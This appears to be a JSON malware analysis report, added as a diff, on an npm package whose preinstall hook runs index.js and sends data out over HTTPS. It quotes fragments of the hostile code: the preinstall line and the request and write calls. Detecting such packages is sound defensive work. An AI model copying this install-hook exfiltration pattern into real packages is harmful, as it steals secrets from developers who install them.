@@ -1,0 +1,51 @@
+{
+  "package_metadata": {
+    "name": "elasticsearch-logstash_reporter",
+    "version": "99.10.8"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/index.js:114",
+        "activity": "Exfiltrating sensitive data to a remote server via HTTPS request"
+      },
+      {
+        "location": "package/index.js:124",
+        "activity": "Writing postData to the exfiltration request"
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/package.json:8",
+        "action": "Preinstall script executing arbitrary code: node index.js"
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/package.json",
+        "code_snippet": "  \"preinstall\":\"node index.js\""
+      },
+      {
+        "filename": "package/index.js",
+        "code_snippet": "var req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n});"
+      },
+      {
+        "filename": "package/index.js",
+        "code_snippet": "req.write(postData);"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "indicators": [
+      "Automatic execution of preinstall script",
+      "Sensitive data exfiltration over HTTPS",
+      "Potential exploitation of environment variables or secrets"
+    ]
+  }
+}
